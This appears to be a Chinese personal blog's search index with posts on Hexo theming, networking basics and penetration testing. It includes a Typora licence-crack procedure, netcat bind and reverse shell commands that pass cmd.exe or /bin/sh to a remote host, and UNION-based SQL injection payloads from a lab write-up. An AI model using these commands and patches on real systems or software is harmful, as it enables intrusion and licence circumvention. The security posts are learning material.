[{"title":"Github+PicGo图床","path":"/posts/e53fe72/","content":"PicGo: 一个用于快速上传图片并获取图片 URL 链接的工具支持如下图床：七牛图床、腾讯云、又拍云、GitHub、SM.MS、阿里云、Imgur图片上传+管理新体验，支持macOS,Windows,Linux 1、新建GitHub仓库 创建New repository 填写仓库信息，Repository name自命名，仓库设置为Public 2、创建token3、下载PicGo","tags":["图床"]},{"title":"hexo-stellar全局音乐","path":"/posts/a02eb088/","content":"使用APlayer+MetingJS方便快捷地为你的博客添加歌单 1、安装依赖 参考 安装hexo-tag-aplayer 12yarn add hexo-tag-aplayernpm -i hexo-tag-aplayer --save 修改&#x2F;bolg&#x2F;_config.yml配置 123# 音乐播放器aplayer: meting: true 2、生成歌单 打开网易云音乐，将喜欢的歌都加入歌单，然后点击生成外链 网易云音乐 3、插入代码 参考APlayer 跳转页面保持音乐播放进度 参考Hexo添加全局音乐播放-APlayer(包含位置修改) &#x2F;bolg&#x2F;themes&#x2F;stellar&#x2F;layout&#x2F;_partial&#x2F;main&#x2F;footer.ejs 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css&quot;&gt;&lt;!--我的APlayer的样式https://gcore.jsdelivr.net/gh/mikeytki/CDN@main/css/APlayer.min.css--&gt; &lt;script src=&quot;https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.js&quot;&gt;&lt;/script&gt;&lt;!--APlayer的依赖--&gt; &lt;script src=&quot;https://unpkg.com/meting@2/dist/Meting.min.js&quot;&gt;&lt;/script&gt;&lt;!--Meting的依赖--&gt; &lt;meting-js server=&quot;netease&quot; type=&quot;playlist&quot; autoplay=false lrc-type=3 fixed=true id=&quot;4926587734&quot; theme=&quot;#ad7a86&quot;&gt; &lt;/meting-js&gt; &lt;script src=&quot;https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.bootcss.com/jquery.pjax/1.9.6/jquery.pjax.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; ap = null Object.defineProperty(document.querySelector(&#x27;meting-js&#x27;),&quot;aplayer&quot;,&#123; set: function(aplayer) &#123; ap=aplayer ready(); &#125; &#125;); isRecover = false; function ready()&#123; ap.on(&#x27;canplay&#x27;, function () &#123; if(!isRecover)&#123; if(localStorage.getItem(&quot;musicIndex&quot;) != null)&#123; musicIndex = localStorage.getItem(&quot;musicIndex&quot;); musicTime = localStorage.getItem(&quot;musicTime&quot;); if(ap.list.index != musicIndex)&#123; ap.list.switch(musicIndex); &#125;else&#123; ap.seek(musicTime); ap.play(); localStorage.clear(); isRecover = true; &#125; &#125;else&#123; isRecover = true; &#125; &#125; &#125;); &#125; window.onbeforeunload = function(event) &#123; if(!ap.audio.paused)&#123; musicIndex = ap.list.index; musicTime = ap.audio.currentTime; localStorage.setItem(&quot;musicIndex&quot;,musicIndex); localStorage.setItem(&quot;musicTime&quot;,musicTime); &#125; &#125;;&lt;/script&gt; 修改上面id 也可以在&#x2F;blog&#x2F;themes&#x2F;stellar&#x2F;source&#x2F;css&#x2F;main.styl引用APlayer.min.css文件 1@import &#x27;APlayer.min.css&#x27;","tags":["stellar"],"categories":["hexo"]},{"title":"Typora破解","path":"/posts/63b1c12d/","content":"Typora 破解Mac Typora 官网：https://typora.io/ Typora 中国官网：https://typoraio.cn/ 先打开 Typora 应用程序右击 Typora， 点击 显示包内容 依次进入： Resources&#x2F;TypeMark&#x2F;page-dist&#x2F;static&#x2F;js&#x2F; vim Licenselndex.180dd4c7.54395836.chunk.js hasActivated&#x3D;”true”&#x3D;&#x3D;e.hasActivated 替换为 hasActivated&#x3D;”true”&#x3D;&#x3D;”true” 关闭 Typora 重启即可 Windows 查看大佬博客https://github.com/743859910/Typora_Unlocker","tags":["软件"],"categories":["软件破解"]},{"title":"Mac彻底清除pycharm","path":"/posts/e8d2c75a/","content":"在mac上卸载重装pycharm后，点击pycharm无法打开。小编是直接将pycharm放入废纸篓进行卸载的，这样并未完全卸载pycharm，会有一些残留文件。原有pycharm未卸载干净，导致新装pycharm无法打开。 清除pycharm残留文件 打开终端，通过终端指令清除残留文件，需在以下四处清除残留文件 1、Preferences文件123cd ~/Library/Preferences/ #进入目录1s # 查看文件列表，查找pycharm版本（已知pycharm版本，可忽略该步）rm -rf PyCharm2019.2/ #清除pycharm残留文件 2、Logs文件下清除12cd ~/Library/Logs #进入目录rm -rf PyCharm2019.2/ # 清除pycharm残留文件 3、Application文件下清除12cd ~/Library/Application\\Support/ #进入入目录rm -rf PyCharm2019.2/ # 清除pycharm残留文件 4、Caches文件下清除12cd ~/Library/Caches/ #进入目录rm -rf PyCharm2019.2/ #清除pycharm残留文件","tags":["pycharm"],"categories":["软件"]},{"title":"MAC地址学习","path":"/posts/69809daf/","content":"交换机主要用于在同一局域网（LAN）内连接多个设备（如计算机、打印机等）。它通过MAC地址表来识别和转发数据帧，使得数据只发送到目标设备，而不是网络中的所有设备，从而提高了网络效率和安全性。 MAC地址学习1. 假设交换机A和B的MAC地址表是空的，主机11向主机33发送数据帧。 2. 交换机A接收到数据帧后，执行以下操作。（1） 交换机A学习主机11的MAC地址和端口号，此时交换机A的MAC地址表如下图所示。 （2） 交换机A查看自己的MAC地址表。 （3） 如果MAC地址表中有目的主机MAC地址则直接进行数据转发，如果没有则继续执行步骤4。（4） 交换机A向除源数据发送端口外的其他所有端口发送广播（这里交换机A从端口2和端口3向外发送广播）。 3. 交换机B在接收到数据帧后，执行以下操作。（1） 交换机B学习源MAC地址和端口号，此时交换机B的MAC地址表如下图所示。 （2） 交换机B查看自己的MAC地址表。 （3） 交换机B向除源数据发送端口外的其他所有端口发送广播（这里交换机B从端口1和端口2向外发送广播）。 4. 主机22查看接收到的数据帧，发现目标MAC地址不是自己，丢弃数据帧。5. 主机33接收数据帧，主机44丢弃数据帧。6. 假设这时候主机44要给主机11发送数据帧。7. 交换机B接收到数据帧后，执行以下操作。（1） 交换机B学习主机44的MAC地址和端口号，此时交换机B的MAC地址表如下图所示。 （2） 交换机B查看自己的MAC地址表，根据MAC地址表中的条目，单播转发数据到端口3。 8. 交换机A在接收到数据帧后，执行以下操作。（1） 交换机A学习源MAC地址和端口号，此时交换机A的MAC地址表，如下图所示。 （2） 交换机A查看自己的MAC地址表，根据MAC地址表中的条目，单播转发数据到端口1。 （3） 主机11接收到数据帧。至此，MAC地址学习过程结束。","tags":["网工"],"categories":["网络工程"]},{"title":"博客个性化页脚","path":"/posts/699ee88d/","content":"页脚设置，运行时正确显示显示您网站的运行时间，并每秒更新一次。消息根据一天中的不同小时而变化。个性化页脚可以通过添加自定义信息、社交媒体链接和动态内容（如网站运行时间和访客统计）来增强用户体验。利用图标（如FontAwesome）和样式（如CSS）美化页脚，使其既美观又实用。此外，可加入版权声明和联系方式，以建立品牌形象和用户信任。 修改footer.ejs themes&#x2F;stellar&#x2F;layout&#x2F;_partial&#x2F;main&#x2F;footer.ejs中末尾添加以下代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;%const content = theme.footer.content?.replace(&#x27;&#123;author.name&#125;&#x27;, (config.author || &#x27;Anonymity&#x27;))?.replace(&#x27;&#123;theme.name&#125;&#x27;, stellar_info(&#x27;name&#x27;))?.replace(&#x27;&#123;theme.version&#125;&#x27;, stellar_info(&#x27;version&#x27;))?.replace(&#x27;&#123;theme.tree&#125;&#x27;, stellar_info(&#x27;tree&#x27;))function layoutDiv() &#123; var el = &#x27;&#x27; el += `&lt;footer class=&quot;page-footer$&#123;scrollreveal(&#x27; &#x27;)&#125; footnote&quot;&gt;` el += &#x27;&lt;hr&gt;&#x27; // sitemap if (theme.footer.sitemap &amp;&amp; Object.keys(theme.footer.sitemap).length &gt; 0) &#123; el += &#x27;&lt;div class=&quot;sitemap&quot;&gt;&#x27; for (let group of Object.keys(theme.footer.sitemap)) &#123; let items = theme.footer.sitemap[group] if (items == undefined || items.length == 0) &#123; continue &#125; el += &#x27;&lt;div class=&quot;sitemap-group&quot;&gt;&#x27; el += &#x27;&lt;span class=&quot;fs15&quot;&gt;&#x27; + group + &#x27;&lt;/span&gt;&#x27; items.forEach((item, i) =&gt; &#123; el += &#x27;&lt;a href=&quot;&#x27; + url_for(md_link(item)) + &#x27;&quot;&gt;&#x27; el += __(md_text(item)) el += &#x27;&lt;/a&gt;&#x27; &#125;); el += &#x27;&lt;/div&gt;&#x27; &#125; el += &#x27;&lt;/div&gt;&#x27; &#125; // footer content el += &#x27;&lt;div class=&quot;footer-content&quot;&gt;&#x27; if (content) &#123; el += markdown(content) &#125; el += &#x27;&lt;span id=&quot;runtime_span&quot;&gt;&lt;/span&gt;&#x27; el += &#x27;&lt;/div&gt;&lt;/footer&gt;&#x27; return el&#125;%&gt;&lt;%- layoutDiv() %&gt;&lt;script type=&quot;text/javascript&quot;&gt; function show_runtime() &#123; window.setTimeout(show_runtime, 1000); const startDate = new Date(&quot;2023/05/10 17:00:00&quot;); const currentDate = new Date(); const timeDifference = currentDate - startDate; const millisecondsInADay = 24 * 60 * 60 * 1000; const days = timeDifference / millisecondsInADay; const fullDays = Math.floor(days); const hours = (days - fullDays) * 24; const fullHours = Math.floor(hours); const minutes = (hours - fullHours) * 60; const fullMinutes = Math.floor(minutes); const seconds = Math.floor((minutes - fullMinutes) * 60); const timeString = `$&#123;fullDays&#125; 天 $&#123;fullHours.toString().padStart(2, &#x27;0&#x27;)&#125; 小时 $&#123;fullMinutes.toString().padStart(2, &#x27;0&#x27;)&#125; 分 $&#123;seconds.toString().padStart(2, &#x27;0&#x27;)&#125; 秒`; const currentHour = currentDate.getHours(); // 获取当前小时数 let message; if (currentHour &lt; 18 &amp;&amp; currentHour &gt;= 9) &#123; // 使用当前小时数进行条件判断 message = `&lt;img class=&#x27;boardsign&#x27; src=&#x27;https://img.shields.io/badge/mikey-red?style=social&amp;logo=BuyMeACoffee&#x27; title=&#x27;祝我马上财富自由呀~&#x27;&gt;&lt;br&gt; &lt;div style=&quot;font-size:13px;font-weight:bold&quot;&gt; 本站居然运行了 $&#123;timeString&#125; &lt;i id=&quot;heartbeat&quot; class=&quot;fas fa-heartbeat&quot;&gt;&lt;/i&gt;&lt;br&gt; &lt;/div&gt; &lt;div style=&quot;font-size:13px;font-weight:bold&quot;&gt; 本博客所有文章除特别声明外，均采用&lt;a href=&quot;https://creativecommons.org/licenses/by-nc-sa/4.0/&quot;&gt;[CC BY-NC-SA 4.0]&lt;/a&gt; 许可协议，转载请注明出处。 &lt;/div&gt;`; &#125; else &#123; message = `&lt;img class=&#x27;boardsign&#x27; src=&#x27;https://img.shields.io/badge/sleep-red?style=social&amp;logo=BuyMeACoffee&#x27; title=&#x27;下班了就该开开心心地玩耍~&#x27;&gt;&lt;br&gt; &lt;div style=&quot;font-size:13px;font-weight:bold&quot;&gt; 本站居然运行了 $&#123;timeString&#125; &lt;i id=&quot;heartbeat&quot; class=&quot;fas fa-heartbeat&quot;&gt;&lt;/i&gt;&lt;br&gt; &lt;/div&gt; &lt;div style=&quot;font-size:13px;font-weight:bold&quot;&gt; 本博客所有文章除特别声明外，均采用&lt;a href=&quot;https://creativecommons.org/licenses/by-nc-sa/4.0/&quot;&gt;[CC BY-NC-SA 4.0]&lt;/a&gt; 许可协议，转载请注明出处。 &lt;/div&gt; &lt;br&gt;`; &#125; document.getElementById(&quot;runtime_span&quot;).innerHTML = message; &#125; show_runtime();&lt;/script&gt; 插入心跳图标 首先，确保您的博客中包含 Font Awesome。您可以将 Font Awesome CDN 链接添加到主题的布局文件中 在themes&#x2F;stellar&#x2F;layout&#x2F;_partial&#x2F;head.ejs中末尾添加以下代码 1&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css&quot;&gt; 修改icons.yml 在themes&#x2F;stellar&#x2F;_data&#x2F;icons.yml中末尾添加以下代码 123heartbeat: id: &quot;heartbeat&quot; class: &quot;fas fa-heartbeat&quot; 修改_custom.styl 在themes&#x2F;stellar&#x2F;source&#x2F;css&#x2F;_custom.styl中末尾添加以下代码 footer为页脚居中设置，heartbeat为跳动的心 1234567891011121314151617181920212223.page-footer &#123; text-align: center; /* Center all text inside the footer */&#125;.footer-content &#123; display: flex; flex-direction: column; align-items: center;&#125;#heartbeat &#123; color: red; animation: heartbeat 1s infinite;&#125;@keyframes heartbeat &#123; 0%, 25%, 50%, 75%, 100% &#123; transform: scale(1); &#125; 20%, 45%, 55%, 70% &#123; transform: scale(1.3); &#125;&#125; _config.stellar.yml配置(themes&#x2F;stellar&#x2F;_config.yml文件)1234footer: content: |# 本站由 [&#123;author.name&#125;](/) 使用 [&#123;theme.name&#125; &#123;theme.version&#125;](&#123;theme.tree&#125;) 主题创建。# 本博客所有文章除特别声明外，均采用 [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/) 许可协议，转载请注明出处。","tags":["stellar"],"categories":["hexo"]},{"title":"14天","path":"/posts/ef627937/","content":"JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目;在前端开发和安全测试中，查找和分析JavaScript代码中的关键字和敏感信息是一项重要的任务。以下是一些用于递归爬取域名、分析页面中的JavaScript文件以及提取相关信息的工具和资源。 前端js代码搜索关键词src=path=method:&quot;get&quot;http.get(&quot;method:&quot;post&quot;http.post(&quot;$.ajaxhttp://service.httpposthttp://service.httpget JSINFO-SCAN https://github.com/p1g3/JSINFO-SCAN 递归爬取域名(netloc&#x2F;domain)，以及递归从JS中获取信息的工具。 JSFinder https://github.com/Threezh1/JSFinder 这里面比较差的 JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具 python JSFinder.py -u https://passer-by.com/pacman/ -d URLFinder https://github.com/pingc0y/URLFinder URLFinder是一款快速、全面、易用的页面信息提取工具,用于分析页面中的js与url,查找隐藏在其中的敏感信息或未授权api接口 URLFinder.exe -u https://passer-by.com/pacman/ -s 200 -m 2 FindSomething https://github.com/momosecurity/FindSomething 该工具是用于快速查在网页的html源码或js文件中提取URL，子域名的插件,该工具是用于快速在网页的html源码或js代码中提取一些有趣的信息的浏览器插件，包括请求的资源、接口的url，请求的ip和域名，泄漏的证件号、手机号、邮箱等信息。 FFUF https://github.com/ffuf/ffuf 模糊化工具，支持多种模糊化方式，支持多线程，支持自定义模糊化方式，支持自定义输出格式，支持 ffuf.exe -w httparchive_js_2023_10_28.txt -u https://passer-by.com/pacman/FUZZ -mc 200 ffuf.exe -w httparchive_js_2023_10_28.txt -u https://passer-by.com/pacman/FUZZ -t 200 wordlists https://wordlists.assentnote.io 项目地址https://github.com/assetnote/wordlists 功能强大的模糊化工具，用它来FUZZ模糊化js文件 Packer Fuzzer https://github.com/rtcatc/Packer-Fuzzer 一款针对Webpack等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具","tags":["web"],"categories":["信息收集"]},{"title":"信息打点","path":"/posts/9099c97b/","content":"信息收集是渗透测试的前期核心任务，是整个过程中的关键环节。只有收集到足够详尽的信息，才能为后续的测试提供有力支持。信息收集的主要内容包括网站的域名及子域名信息、目标网站的详细信息、网站的真实IP地址、敏感文件和目录、开放端口和中间件的信息等。通过各种渠道和方法尽可能多地获取该站点的相关信息，有助于我们发现更多的潜在渗透点和攻击突破口。 信息收集参考https://www.freebuf.com/articles/web/340195.html参考https://websec.readthedocs.io/zh/latest/info/port.html 工具网站棱角社区 (https://forum.ywhack.com/bountytips.php?tools) WEB域名备案信息 通过查询备案信息了解到该网站的所有者、联系人、电话号码、邮箱等敏感信息，从而尝试使用社会工程学或其他攻击手段 备案信息查询(http://www.beianx.cn/) 备案管理系统(https://beian.miit.gov.cn/) 企业产权 查找该网站所属企业的注册信息，了解企业的名称、地址、联系电话、注册资本等信息。小蓝本，免费，但是有些信息不全，或查不到，各网站结合使用，各自信息来源可能不同，包含内容可能不同。 天眼查(https://www.tianyancha.com/) 小蓝本(https://www.xiaolanben.com/) 爱企查(https://aiqicha.baidu.com/) 企查查(https://www.qcc.com/) 国外企查(https://opencorporates.com/) 注册域名 查询域名注册商的信息，以了解域名的注册者、联系方式、DNS服务器等敏感信息 域名注册查询(https://buy.cloud.tencent.com/domain) 反查解析 使用反查解析工具，查询该网站所使用的所有IP地址，以了解该网站的网络拓扑结构和架构 IP反查域名 爱站网(https://site.ip138.com/) 情报社区(https://x.threatbook.cn/) DNS数据 有将域名解析到某个IP的历史，就会留下记录，DNS数据即通过查询历史记录查到解析记录，对于查CDN有帮助，可能会查到没有CDN服务时的IP 超级ping(https://www.17ce.com/) 超级ping(https://ping.chinaz.com/) 接口查询 (https://get-site-ip.com/) IP社区库 (https://www.cz88.net/geo-public) 证书查询（HTTPS） HTTPS有证书，通过目标的证书，匹配其他哪些网站用过该证书 缺点：只针对HTTPS的网站，但是绝大部分重要的有价值的网站都会使用HTTPS CertificateSearch (https://crt.sh/) 网络空间 查询获取目标的信息 fofa (https://fofa.info/) 全球鹰 (http://hunter.qianxin.com/) 360夸克 (https://quake.360.cn/quake/#/index) 钟馗之眼 (https://www.zoomeye.org/?R1nG) 威胁情报 微步 (https://x.threatbook.cn/) 奇安信 (https://ti.qianxin.com/) 360 (https://ti.360.cn/#/homepage) 绿盟科技 (https://ti.nsfocus.com) 枚举解析 暴力破解，用字典跑。网站接口。 在线子域名查询 (http://tools.bugscaner.com/subdomain/) DNSGrep子域名查询 (https://www.dnsgrep.cn/subdomain) 子域名查询(https://dnsdumpster.com/) Layer OneForAll（子域名收集工具） 安全测试用的最多的子域名收集工具，实现以上情况的总结（网络空间、威胁情报除外） 工具强大的子域名收集器 (https://github.com/shmilylty/OneForAll)12python3 oneforall.py --target example.com runpython3 oneforall.py --targets ./example.txt run Web架构资产 程序语言 asp,php,aspx,jsp,py等 搭建平台 搭建平台是程序员开发网站时使用的工具，搭建平台分为开源和闭源。 获取程序源码用于代码审计（白盒测试），即从代码中挖掘漏洞。 有无源码影响测试类型： 无源码-黑盒测试 有源码-白盒测试（代码审计）、黑盒测试都可做 前端-框架源码 jQuery &#x2F; BootStrap &#x2F; Vue &#x2F; React &#x2F; Angular等 中间件探针 Web服务器：Apache &#x2F; Nginx &#x2F; Microsoft IIS等 应用服务器：Tomcat &#x2F; Jboss &#x2F; Weblogic &#x2F; Node.js等 web服务器与应用服务器的区别 Web服务器主要用于处理静态内容和HTTP请求，而应用服务器则用于处理动态内容和更复杂的操作。两者通常都会结合使用，以便提供完整的Web应用程序服务。 Web服务器：提供静态内容，如HTML、CSS和JavaScript等，以及处理对这些内容的HTTP请求 应用服务器：提供动态内容，如数据库查询和Web应用程序逻辑等，通常与Web服务器协同工作,需要用到端口扫描 其他类型服务器 数据库服务器：MySQL、PostgreSQL、Oracle等 文件服务器：Samba、FTP服务器等 邮件服务器：Exchange、Sendmail、Postfix等 DNS服务器：BIND、PowerDNS等 聊天服务器：XMPP服务器等 游戏服务器：Minecraft服务器、Steam服务器等 VPN服务器：OpenVPN、IPsec等 视频流服务器：Wowza Streaming Engine、NGINX RTMP等 后端-开源-指纹识别-源码下载 指纹识别平台识别出CMS TideFinger潮汐(http://finger.tidesec.net/) 云悉指纹(https://www.yunsee.cn/) Wappalyzer(https://github.com/AliasIO/wappalyzer) cmsmap cmseek 后端-闭源–源码泄漏 参考(https://www.secpulse.com/archives/124398.html) 1：识别出大致信息却无下载资源 2：未识别出信息使用码云资源获取 3：其他行业开发使用对口资源站获取 gitee (https://gitee.com/) github (https://github.com/) 互站网-源码售卖(https://www.huzhan.com/) 操作系统 Ping返回的TTL字段值可以猜测操作系统类型 Linux TTL=64是Linux系统 Windows TTL=128是Windows系统 Unix TTL=255是Unix系统 敏感目录扫描 robots.txt 后台目录 mysql管理接口 phpinfo 状态码 200 正常访问、302 跳转、404 不存在、403 没权限、50x 服务器内部错误 御剑、wwwscan、dirbuster、webrobot 端口扫描 参考(https://www.se7ensec.cn/2018/11/28/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93) Nmap、Masscan、网络空间 Nmap：端口扫描，应用协议，防火墙识别 下载(https://nmap.org/download.html) 使用(https://blog.csdn.net/qq_53079406/article/details/125263917) Masscan：端口扫描，应用协议 (https://github.com/robertdavidgraham/masscan) (https://www.cnblogs.com/lzy575566/p/15513726.html) 旁注和C段 旁注攻击 利用同一主机上面不同网站的漏洞得到webshell，从而利用主机上的程序或者是服务所暴露的用户所在的物理路径进行入侵； 通俗来说就是，同一个服务器上存在多个站点，如A、B站点，你在对A进行测试的时候没有攻击的入手点，通过测试B网站进入服务器然后在攻击A网站最终实现目的； 方法或工具 IP反查、SQL跨库查询、目录越权、whois信息等 C段渗透 不同服务器上面存放不同网站，并且都处于同一个网段 x.x.x.1-255属于同一个C段，例如192.168.1.1 ,那么192.168.1.1-192.168.1.255 都属于同一个C段，有些学校或者大公司，他们会持有整个IP段，这个ip段中所有的ip都是那个公司的资产，拿下一台可能有有用的信息，可能在同一内网。 旁站是同ip网站，C段是公网IP同一网段下的网站。 C段不是内网，但是有可能同一个C端在同一个内网 CDN 出现多个IP即启用CDN服务 入站：ping 或 请求网站 是自己请求的 —&gt;cdn节点 出站： 对方服务器去请求你设置的资源—-&gt;真实IP CDN服务识别： 超级ping(https://ping.chinaz.com/) CDN绕过 (https://mp.weixin.qq.com/s/zxEH-HMqKukmq7qXfrdnQQ) (https://zhuanlan.zhihu.com/p/33440472) WAF 参考(https://blog.csdn.net/weixin_44420143/article/details/118602836) 简介：Web Application Firewall，即web应用防护系统 作用：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。 功能： 漏洞攻击防护，如SQL注入、XSS攻击等 虚拟补丁：就是给网站打补丁，防止一些0day攻击 提供实时防护：就跟PC里面装的360安全卫士一样 原理：对HTTP&#x2F;HTTPS的请求报文进行分析，如果检测到是攻击行为（如对SQL注入的检测，就会对报文中的SQL语句检测特定的注入字符排列），则会进行阻断，将报文丢弃，不会让请求通过，同时，还可能对攻击源的IP地址进行封杀） WAF分类： 云WAF：百度安全宝、阿里云盾、长亭雷池，华为云，亚马逊云等 硬件WAF：绿盟、安恒、深信服、知道创宇等公司商业产品 软件WAF：宝塔，安全狗、D盾等 代码级WAF：自己写的waf规则，防止出现注入等，一般是在代码里面写死的","tags":["web"],"categories":["信息收集"]},{"title":"ChatGPT本地部署","path":"/posts/fc5b3490/","content":"潘多拉 (Pandora)项目服务以及服务器关停 Docker部署本地ChatGPT项目简介潘多拉 (Pandora)，一个让你呼吸顺畅的 ChatGPT。潘多拉实现了网页版 ChatGPT 的主要操作。后端优化，绕过 Cloudflare，速度喜人。 体验地址 大佬的官网网站关注最新消息这里 点击 https://chat1.zhile.io 最新拿 Access Token 的技术原理，我记录在这里了。 可以访问 这里 拿 Access Token 也可以官方登录，然后访问 这里 拿 Access Token Access Token 有效期 14 天，期间访问不需要梯子。这意味着你在手机上也可随意使用。 这个页面上还包含一个共享账号的链接，没有账号的可以点进去体验一下。 项目部署一、Docker环境 点击https://yeasy.gitbook.io/docker_practice&#x2F;install 安装完成后，运行 docker version 检查是否安装成功 二、Docker Compose 点击https://dockerdocs.cn/compose/install/ 安装完成后，运行 docker-compose version 检查是否安装成功 三、docker-compose.yml 创建docker-compose.yml文件1vim docker-compose.yml 添加如下内容1234567891011version: &#x27;3&#x27; # 这是一个Docker Compose文件的版本声明，它表明该文件符合Docker Compose文件格式版本3services: pandora: #服务名，自定义 container_name: pandora #容器名，自定义r estart: always #开启自启动其他选项看以下备注 image: pengzhile/pandora #镜像名一般都是使用的哪个镜像就写哪个镜像。 ports: - &#x27;8181:8181&#x27; # 冒号:左边的8899可以改成任意vps上未使用过的端口,冒号右边是本docker镜像里的端口 environment: - PANDORA_SERVER=0.0.0.0:8899 #以http服务方式启动，格式：ip:port。 - PANDORA_ACCESS_TOKEN= #填入ACCESS_TOKEN 四、运行 运行docker-compose up -d 运行docker ps查看是否运行成功 运行docker logs -f pandora查看运行日志 运行docker exec -it pandora /bin/bash进入容器 运行docker-compose down关闭容器 docker删除镜像 运行docker ps -a 得到 CONTAINER ID 运行docker stop CONTAINER ID 运行docker rm CONTAINER ID 运行docker images 得到 IMAGE ID 运行docker rmi IMAGE ID 五、打开网站 http://127.0.0.1:8181 在服务器上搭建则：http:&#x2F;&#x2F;服务器地址:8181 六、登陆 点击Continue with Access Token 输入PANDORA_ACCESS_TOKEN内容 七、获取ACCESS_TOKEN 点击https://github.com/wozulong/ChatGPTAuthHelper/releases/tag/v2.0.0下载 zip &#x2F; tar.gz 并解压缩 打开 Chrome ，地址栏输入： chrome:&#x2F;&#x2F;extensions 打开 扩展程序 设置页面。 右上角打开 开发者模式 。 点击左上角 加载已解压的扩展程序 按钮，选择刚下载解压的插件文件夹内的 src 目录，确定安装。 你可以在 扩展程序 中看到 ChatGPT Auth Helper 说明安装成功。 现在你的 Chrome 可以用来使用 https://ai.fakeopen.com/auth 服务了。 登陆后复制ACCESS_TOKEN 也可以点击 https://chat1.zhile.io体验","tags":["搭建"]},{"title":"shell","path":"/posts/4592b2fd/","content":"反弹Shell是一种在渗透测试和攻击过程中常用的技术，通过这种技术，攻击者可以在受害者机器上执行命令并获取一个远程控制的Shell。具体实现方式是受害者机器主动发起一个连接到攻击者的机器上，通常是通过网络连接（比如TCP），然后攻击者通过这个连接向受害者机器发送命令，从而实现对受害者系统的控制。这种方法绕过了防火墙和其他安全机制的限制，因为它是受害者机器主动发起的连接。 ShellShell是一个命令行解释器，它为用户提供了一个向Linux内核发送请求以便运行程序的界面系统 反弹ShellReverse Shell，就是控制端首先监听某个 TCP&#x2F;UDP 端口，然后被控制端向这个端口发起一个请求，同时将自己命令行的输入输出转移到控制端，从而控制端就可以输入命令来控制被控端了。点击，访问大佬博客 正向连接本地监听端口Linux控制Windows，Windows绑定SH到本地1234监听端口，Linux主动连接目标1234 12Windows: nc -e cmd.exe -lvp 1234Linux: ncat x.x.x.x(对方服务器IP) 1234 反向连接远程监听端口Windows控制Linux，Linux绑定SH到对方服务器1234端口，Windows监听本地端口1234 12Linux: ncat x.x.x.x(对方服务器IP) -e /bin/shWindows: nc -lvnp 1234","tags":["web"],"categories":["web"]},{"title":"SQL注入漏洞测试(HTTP头注入)","path":"/posts/74d3b872/","content":"SQL注入HTTP头部注入是一种攻击技术，攻击者通过在HTTP请求头部（如User-Agent、Referer、Cookie等）中注入恶意的SQL代码，试图操纵目标服务器的数据库查询。由于服务器端可能在处理这些头部信息时直接将其插入到SQL查询中，如果没有适当的输入验证和参数化查询，这些恶意代码就可能被执行，从而导致数据泄露、数据篡改或其他安全问题。这种攻击方式利用了HTTP头部字段通常不被严格验证的弱点。 SQL注入漏洞测试(HTTP头注入)题目类型SQL注入 使用工具FireFox、burpsuite 解题方向HTTP头部（HOST注入） Host（主机头）HTTP协议的一个字段 在http1.0中没有Host字段，在http1.1中，增加这个字段，http协议是建立tcp连接，需要知道对方的IP和端口号，然后发送数据建立连接。所有Host头域指定请求资源的Internet主机和端口。host头主要是用来将请求分派到指定的web网站，它的IP来自于网络层和传输层，对于http协议来说，它是基于tcp/ip的一个封装 在http1.1中不能缺少Host字段，缺少host字段服务器会返回400 bad request ，http1.0虽然不能缺少Host字段，但是该字段可以为空。 既然host头来自于客户，由客户端提供，而且可以修改，那么它是不可信的。当Host头部被修改为无效Host头会发生什么情况？大多数web服务器配置为将无法识别的Host头传送给列表中的第一台虚拟主机或者返回错误信息。因此，这使得把携带有任意Host头的请求发送到第一台虚拟主机上是可能的。 例如下面，很多host都不做HTML编码，便直接输出到页面，当host 被改为恶意连接时，出发恶意请求，容易造成缓存污染和密码重置这两种攻击 123 &lt;link href=http://_SERVER[&quot;HTTP_HOST&quot;]&gt;&lt;/link&gt; //触发一个get请求 &lt;form method=”POST”&gt;&lt;/form&gt; //触发POST请求 题解I.启动靶场1order by 5# 报错，所以4字段 II. 查看字段位置1union select 1,2,3,4# III. 获取数据库名1union select 1,database(),3,4# database &#x3D; pentesterlab IV. 获取数据库中的表名1union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database() comment&#x2F;flag&#x2F;goods&#x2F;user&#x2F; V. 获取的表名中的列名1union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;flag&#x27; id&#x2F;flag VI. 获取id与flag值1union select 1,id,flag,4 from flag VII. 验证","categories":["web"]},{"title":"Hexo","path":"/posts/b132932/","content":"关于themes-butterfly主题的解决方案 如何设置单图页面插入代码 在 &#x2F;blog&#x2F;source&#x2F; 下新建 css 文件夹,文件夹中建 xxx.css 1234567891011121314151617181920212223/* 页脚与头图透明 */#footer &#123; background: transparent !important;&#125;#page-header &#123; background: transparent !important;&#125;/* 白天模式遮罩透明 */#footer::before &#123; background: transparent !important;&#125;#page-header::before &#123; background: transparent !important;&#125;/* 夜间模式遮罩透明 */[data-theme=&quot;dark&quot;] #footer::before &#123; background: transparent !important;&#125;[data-theme=&quot;dark&quot;] #page-header::before &#123; background: transparent !important;&#125; 修改配置文件 在主题配置文件 &#x2F;blog&#x2F;_config.butterfly.yml 文件中 inject 配置下的 head加入以下代码，引入刚刚创建的 xxx.css文件 123inject: head: - &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/xxx.css&quot; media=&quot;defer&quot; onload=&quot;this.media=&#x27;all&#x27;&quot;&gt; 在主题配置文件 &#x2F;blog&#x2F;_config.butterfly.yml 文件中配置 index_img 和 footer_bg 以及 background 1234567891011# The banner image of home pageindex_img: # Website Background (設置網站背景)# can set it to color or image (可設置圖片 